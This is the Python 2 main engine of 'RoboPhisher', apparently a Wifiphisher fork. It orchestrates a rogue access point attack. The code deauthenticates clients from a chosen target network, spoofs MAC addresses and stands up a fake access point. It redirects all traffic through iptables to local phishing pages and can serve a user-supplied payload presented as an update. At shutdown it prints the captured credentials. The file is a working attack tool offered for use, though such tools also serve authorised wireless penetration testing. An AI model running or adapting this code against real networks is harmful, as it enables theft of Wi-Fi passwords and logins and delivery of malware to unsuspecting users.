#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# pylint: skip-file
import subprocess
import os
import logging
import logging.config
import time
import sys
import argparse
import fcntl
import curses
import socket
import struct
import signal
from threading import Thread
import multiprocessing
from subprocess import Popen, PIPE, check_output
from shutil import copyfile
from robophisher.common.constants import *
import robophisher
import robophisher.common.extensions as extensions
import robophisher.common.recon as recon
import robophisher.arguments as arguments
import robophisher.common.phishingpage as phishingpage
import robophisher.common.phishinghttp as phishinghttp
import robophisher.common.macmatcher as macmatcher
import robophisher.common.interfaces as interfaces
import robophisher.common.firewall as firewall
import robophisher.common.accesspoint as accesspoint
import robophisher.common.tui as tui
import robophisher.common.opmode as opmode

logger = logging.getLogger(__name__)

# Fixes UnicodeDecodeError for ESSIDs
reload(sys)
sys.setdefaultencoding('utf8')


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-jI",
        "--jamminginterface",
        type=arguments.validate_monitor_interface,
        help=("Manually choose an interface that supports monitor mode for " +
              "deauthenticating the victims. " + "Example: -jI wlan1"))
    parser.add_argument(
        "-aI",
        "--apinterface",
        type=arguments.validate_ap_interface,
        help=("Manually choose an interface that supports AP mode for  " + "spawning an AP. " +
              "Example: -aI wlan0"))
    parser.add_argument(
        "-iI",
        "--internetinterface",
        help=("Choose an interface that is connected on the Internet" + "Example: -iI ppp0"))
    parser.add_argument(
        "-nJ",
        "--nojamming",
        help=("Skip the deauthentication phase. When this option is used, " +
              "only one wireless interface is required"),
        action='store_true')
    parser.add_argument(
        "-e",
        "--essid",
        help=("Enter the ESSID of the rogue Access Point. " +
              "This option will skip Access Point selection phase. " +
              "Example: --essid 'Free WiFi'"))
    parser.add_argument(
        "-dE",
        "--deauth-essid",
        help=("Deauth all the BSSIDs having same ESSID from AP selection or " +
              "the ESSID given by -e option"),
        action='store_true')
    parser.add_argument(
        "-p",
        "--phishingscenario",
        help=("Choose the phishing scenario to run." +
              "This option will skip the scenario selection phase. " +
              "Example: -p firmware_upgrade"))
    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=(
            "Add WPA/WPA2 protection on the rogue Access Point. " + "Example: -pK s3cr3tp4ssw0rd"))
    parser.add_argument(
        "-hC",
        "--handshake-capture",
        help=("Capture of the WPA/WPA2 handshakes for verifying passphrase" +
              "Example : -hC capture.pcap"))
    parser.add_argument(
        "-qS",
        "--quitonsuccess",
        help=("Stop the script after successfully retrieving one pair of "
              "credentials"),
        action='store_true')
    parser.add_argument(
        "-iAM", "--mac-ap-interface", help=("Specify the MAC address of the AP interface"))
    parser.add_argument(
        "-iDM",
        "--mac-deauth-interface",
        help=("Specify the MAC address of the jamming interface"))
    parser.add_argument(
        "-iNM",
        "--no-mac-randomization",
        help=("Do not change any MAC address"),
        action='store_true')
    parser.add_argument("--logging", help=("Log activity to file"), action="store_true")
    parser.add_argument("--payload-path", help=("Payload path for scenarios serving a payload"))
    parser.add_argument(
        "-cM",
        "--channel-monitor",
        help="Monitor if target access point changes the channel.",
        action='store_true')

    return parser.parse_args()


args = parse_args()
APs = {}  # for listing APs


def setup_logging(args):
    """
    Setup the logging configurations
    """
    root_logger = logging.getLogger()
    # logging setup
    if args.logging:
        logging.config.dictConfig(LOGGING_CONFIG)
        should_roll_over = False
        # use root logger to rotate the log file
        if os.path.getsize(LOG_FILEPATH) > 0:
            should_roll_over = os.path.isfile(LOG_FILEPATH)
        should_roll_over and root_logger.handlers[0].doRollover()
        logger.info("Starting Wifiphisher")


def kill_interfering_procs():
    """
    Kill the interfering processes that may interfere the wireless card
    :return None
    :rtype None
    ..note: The interfering processes are referenced by airmon-zc.
    """

    # stop the NetworkManager related services
    # incase service is not installed catch OSError
    try:
        subprocess.Popen(['service', 'network-manager', 'stop'], stdout=subprocess.PIPE, stderr=DN)
        subprocess.Popen(['service', 'NetworkManager', 'stop'], stdout=subprocess.PIPE, stderr=DN)
        subprocess.Popen(['service', 'avahi-daemon', 'stop'], stdout=subprocess.PIPE, stderr=DN)
    except OSError:
        pass

    # Kill any possible programs that may interfere with the wireless card
    proc = Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    # total processes in the system
    sys_procs = output.splitlines()  # loop each interfering processes and find if it is running
    for interfering_proc in INTERFERING_PROCS:
        for proc in sys_procs:
            # kill all the processes name equal to interfering_proc
            if interfering_proc in proc:
                pid = int(proc.split(None, 1)[0])
                print('[' + G + '+' + W + "] Sending SIGKILL to " + interfering_proc)
                os.kill(pid, signal.SIGKILL)


def get_chosen_access_point(interface_name):
    """
    Return the chosen access point after displaying all the options to
        the user

    :param interface_name: Name of an interface for sniffing
    :type interface_name: str
    :return:
    :rtype:
    """
    change_channel = multiprocessing.Process(
        target=interfaces.change_channel_periodically, args=(interface_name, 1))
    change_channel.start()

    should_stop = lambda: raw_input()
    should_stop_thread = Thread(target=should_stop)
    should_stop_thread.start()

    displayed_ap = list()
    item_number = 1
    table_format = u"{:^8} {:<20} {:^7} {:<17} {:^10}"

    print(table_format.format("Number", "SSID", "Channel", "BSSID", "Encrypted?"))
    print("-" * 63)

    while should_stop_thread.is_alive():
        new_ap = recon.get_new_ap(interface_name)

        if new_ap not in displayed_ap:
            encryption = u"\u2713" if new_ap.is_encrypted else " "
            print(
                table_format.format(item_number, new_ap.name[:20], new_ap.channel,
                                    new_ap.mac_address, encryption))

            displayed_ap.append(new_ap)
            item_number += 1

    change_channel.terminate()
    change_channel.join()
    should_stop_thread.join()

    print("Please Enter The Number For Your Desired Target:"),
    user_choice = get_integer_in_range(1, item_number - 1)

    return displayed_ap[user_choice - 1]


def get_integer():
    """
    Return an integer after asking the user

    :return: An integer
    :rtype: int
    :Example:

        >>> print("Enter Your Choice: ")
        >>> choice = get_integer()
        Enter Your Choice: haha
        Please Enter An Integer: 2
        >>> choice
        2
    """
    user_input = None
    while user_input is None:
        try:
            user_input = int(raw_input())
        except ValueError:
            print("Please Enter An Integer:"),

    return user_input


def get_integer_in_range(lower_bound, upper_bound):
    """
    Return an integer explicitly within the lower and upper bound
        after asking the user

    :param lower_bound: The lower bound of range
    :param upper_bound: The upper bound of range
    :type lower_bound: int
    :type upper_bound: int
    :return: An integer within the range
    :rtype: int
    :Example:

        >>> print("Please Enter Your Choice: "
        >>> choice = get_integer_in_range(1, 3)
        Please Enter Your Choice: haha
        Please Enter An Integer: 4
        Please Enter An Integer Between 1 and 3: 2
        >>> choice
        2
    """
    while True:
        user_input = get_integer()
        if user_input < lower_bound or user_input > upper_bound:
            print("Please Enter An Integer Between {} and {}:".format(lower_bound, upper_bound)),
        else:
            break

    return user_input


class WifiphisherEngine:
    def __init__(self):
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = phishingpage.TemplateManager()
        self.access_point = accesspoint.AccessPoint()
        self.em = extensions.ExtensionManager(self.network_manager)
        self.opmode = opmode.OpMode()

    def stop(self):
        if DEV:
            print "[" + G + "+" + W + "] Show your support!"
            print "[" + G + "+" + W + "] Follow us: https://twitter.com/robophisher"
            print "[" + G + "+" + W + "] Like us: https://www.facebook.com/Wifiphisher"
        print "[" + G + "+" + W + "] Captured credentials:"
        for cred in phishinghttp.creds:
            logger.info("Creds: %s", cred)
            print cred

        # EM depends on Network Manager.
        # It has to shutdown first.
        self.em.on_exit()
        # move the access_points.on_exit before the exit for
        # network manager
        self.access_point.on_exit()
        self.network_manager.on_exit()
        self.template_manager.on_exit()

        clear_rules_result = firewall.clear_rules()
        if not clear_rules_result.status:
            message = ("Failed to reset the routing rules:\n{}".format(
                clear_rules_result.error_message))
            print(message)
            logger.error(message)

        if os.path.isfile('/tmp/robophisher-webserver.tmp'):
            os.remove('/tmp/robophisher-webserver.tmp')

        print '[' + R + '!' + W + '] Closing'
        sys.exit(0)

    def start(self):

        # Parse args
        global args, APs
        args = parse_args()

        # setup the logging configuration
        setup_logging(args)

        # Initialize the operation mode manager
        self.opmode.initialize(args)
        # Set operation mode
        self.opmode.set_opmode(args, self.network_manager)

        # Are you root?
        if os.geteuid():
            logger.error("Non root user detected")
            sys.exit('[' + R + '-' + W + '] Please run as root')

        self.network_manager.start()

        # TODO: We should have more checks here:
        # Is anything binded to our HTTP(S) ports?
        # Maybe we should save current iptables rules somewhere

        # get interfaces for monitor mode and AP mode and set the monitor interface
        # to monitor mode. shutdown on any errors
        try:
            if self.opmode.internet_sharing_enabled():
                self.network_manager.internet_access_enable = True
                if self.network_manager.is_interface_valid(args.internetinterface, "internet"):
                    internet_interface = args.internetinterface
                    if interfaces.is_wireless_interface(internet_interface):
                        self.network_manager.unblock_interface(internet_interface)
                logger.info("Selecting %s interface for accessing internet",
                            args.internetinterface)
            if self.opmode.advanced_enabled():
                if args.jamminginterface and args.apinterface:
                    if self.network_manager.is_interface_valid(args.jamminginterface, "monitor"):
                        mon_iface = args.jamminginterface
                        self.network_manager.unblock_interface(mon_iface)
                    if self.network_manager.is_interface_valid(args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    mon_iface, ap_iface = self.network_manager.get_interface_automatically()
                # display selected interfaces to the user
                logger.info("Selecting {} for deauthentication and {} for rouge access point"
                            .format(mon_iface, ap_iface))
                print("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                      "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                      "rogue Access Point").format(G, W, mon_iface, ap_iface)

                # randomize the mac addresses
                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)
                    if args.mac_deauth_interface:
                        self.network_manager.set_interface_mac(mon_iface,
                                                               args.mac_deauth_interface)
                    else:
                        self.network_manager.set_interface_mac_random(mon_iface)
            if not self.opmode.deauth_enabled():
                if args.apinterface:
                    if self.network_manager.is_interface_valid(args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    ap_iface = self.network_manager.get_interface(True, False)
                mon_iface = ap_iface

                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)

                print("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                      "rogue Access Point").format(G, W, ap_iface)
                logger.info("Selecting {} interface for rouge access point".format(ap_iface))
                # randomize the mac addresses
                if not args.no_mac_randomization:
                    self.network_manager.set_interface_mac_random(ap_iface)

            # make sure interfaces are not blocked
            logger.info("Unblocking interfaces")
            self.network_manager.unblock_interface(ap_iface)
            self.network_manager.unblock_interface(mon_iface)
            # set monitor mode only when --essid is not given
            if self.opmode.advanced_enabled() or args.essid is None:
                self.network_manager.set_interface_mode(mon_iface, "monitor")
        except (interfaces.InvalidInterfaceError, interfaces.InterfaceCantBeFoundError,
                interfaces.InterfaceManagedByNetworkManagerError) as err:
            logger.exception("The following error has occurred:")
            print("[{0}!{1}] {2}").format(R, W, err)

            time.sleep(1)
            self.stop()

        if not args.internetinterface:
            kill_interfering_procs()
            logger.info("Killing all interfering processes")

        rogue_ap_mac = self.network_manager.get_interface_mac(ap_iface)
        if not args.no_mac_randomization:
            logger.info("Changing {} MAC address to {}".format(ap_iface, rogue_ap_mac))
            print "[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}".format(
                G, W, ap_iface, rogue_ap_mac)

            if self.opmode.advanced_enabled():
                mon_mac = self.network_manager.get_interface_mac(mon_iface)
                logger.info("Changing {} MAC address to {}".format(mon_iface, mon_mac))
                print("[{0}+{1}] Changing {2} MAC addr to {3}".format(G, W, mon_iface, mon_mac))

        redirect_localhost_result = firewall.redirect_to_localhost()
        if not redirect_localhost_result.status:
            message = ("Failed to redirect all requests to local host:\n{}".format(
                redirect_localhost_result.error_message))
            print(message)
            logger.error(message)
            self.stop()

        print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
        time.sleep(1)

        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            # We don't have target attacking MAC in frenzy mode
            # That is we deauth all the BSSIDs that being sniffed
            target_ap_mac = None
            enctype = None
        else:
            # let user choose access point
            # start the monitor adapter
            self.network_manager.up_interface(mon_iface)
            print("Press Enter to stop the access point search")
            raw_input("Press Enter to continue")
            print("")
            chosen_access_point = get_chosen_access_point(mon_iface)

            essid = chosen_access_point.name
            channel = chosen_access_point.channel
            target_ap_mac = chosen_access_point.mac_address
            # Encrytpion could be anything but for now its always set to None
            enctype = None

        # create a template manager object
        self.template_manager = phishingpage.TemplateManager()
        # get the correct template
        tui_template_obj = tui.TuiTemplateSelection()
        template = tui_template_obj.gather_info(args.phishingscenario, self.template_manager)
        logger.info("Selecting {} template".format(template.get_display_name()))
        print("[" + G + "+" + W + "] Selecting " + template.get_display_name() + " template")

        # payload selection for browser plugin update
        if template.has_payload():
            payload_path = args.payload_path
            # copy payload to update directory
            while not payload_path or not os.path.isfile(payload_path):
                # get payload path
                payload_path = raw_input("[" + G + "+" + W + "] Enter the [" + G + "full path" +
                                         W + "] to the payload you wish to serve: ")
                if not os.path.isfile(payload_path):
                    print '[' + R + '-' + W + '] Invalid file path!'
            print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
            template.update_payload_path(os.path.basename(payload_path))
            copyfile(payload_path, PHISHING_PAGES_DIR + template.get_payload_path())

        APs_context = []
        for i in APs:
            APs_context.append({
                'channel': APs[i][0] or "",
                'essid': APs[i][1] or "",
                'bssid': APs[i][2] or "",
                'vendor': self.mac_matcher.get_vendor_name(APs[i][2]) or ""
            })

        template.merge_context({'APs': APs_context})

        # only get logo path if MAC address is present
        ap_logo_path = False
        if target_ap_mac is not None:
            ap_logo_path = template.use_file(self.mac_matcher.get_vendor_logo_path(target_ap_mac))

        template.merge_context({
            'target_ap_channel':
            channel or "",
            'target_ap_essid':
            essid or "",
            'target_ap_bssid':
            target_ap_mac or "",
            'target_ap_encryption':
            enctype or "",
            'target_ap_vendor':
            self.mac_matcher.get_vendor_name(target_ap_mac) or "",
            'target_ap_logo_path':
            ap_logo_path or ""
        })

        # We want to set this now for hostapd. Maybe the interface was in "monitor"
        # mode for network discovery before (e.g. when --nojamming is enabled).
        self.network_manager.set_interface_mode(ap_iface, "managed")
        # Start AP
        self.network_manager.up_interface(ap_iface)
        self.access_point.set_interface(ap_iface)
        self.access_point.set_channel(channel)
        self.access_point.set_essid(essid)
        if args.presharedkey:
            self.access_point.set_psk(args.presharedkey)
        if self.opmode.internet_sharing_enabled():
            self.access_point.set_internet_interface(args.internetinterface)
        print '[' + T + '*' + W + '] Starting the fake access point...'
        try:
            self.access_point.start()
            self.access_point.start_dhcp_dns()
        except BaseException:
            self.stop()
        # If are on Advanced mode, start Extension Manager (EM)
        # We need to start EM before we boot the web server
        if self.opmode.advanced_enabled():
            shared_data = {
                'is_freq_hop_allowed': self.opmode.freq_hopping_enabled(),
                'target_ap_channel': channel or "",
                'target_ap_essid': essid or "",
                'target_ap_bssid': target_ap_mac or "",
                'target_ap_encryption': enctype or "",
                'target_ap_logo_path': ap_logo_path or "",
                'rogue_ap_mac': rogue_ap_mac,
                'APs': APs_context,
                'args': args
            }

            self.network_manager.up_interface(mon_iface)
            self.em.set_interface(mon_iface)
            extensions = DEFAULT_EXTENSIONS
            self.em.set_extensions(extensions)
            self.em.init_extensions(shared_data)
            self.em.start_extensions()
        # With configured DHCP, we may now start the web server
        if not self.opmode.internet_sharing_enabled():
            # Start HTTP server in a background thread
            print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(
                PORT) + ", " + str(SSL_PORT)
            webserver = Thread(
                target=phishinghttp.runHTTPServer,
                args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
            webserver.daemon = True
            webserver.start()

            time.sleep(1.5)

        # We no longer need mac_matcher
        self.mac_matcher.unbind()

        clients_APs = []
        APs = []

        # Main loop.
        try:
            main_info = tui.MainInfo(robophisher.__version__, essid, channel, ap_iface, self.em,
                                     phishinghttp, args)
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
            self.stop()
        except KeyboardInterrupt:
            self.stop()


def run():
    try:
        print('[' + T + '*' + W + '] Starting RoboPhisher %s at %s' %
              (robophisher.__version__, time.strftime("%Y-%m-%d %H:%M")))
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' interrupted\n' + W
    except EOFError:
        print R + '\n (^D)' + O + ' interrupted\n' + W
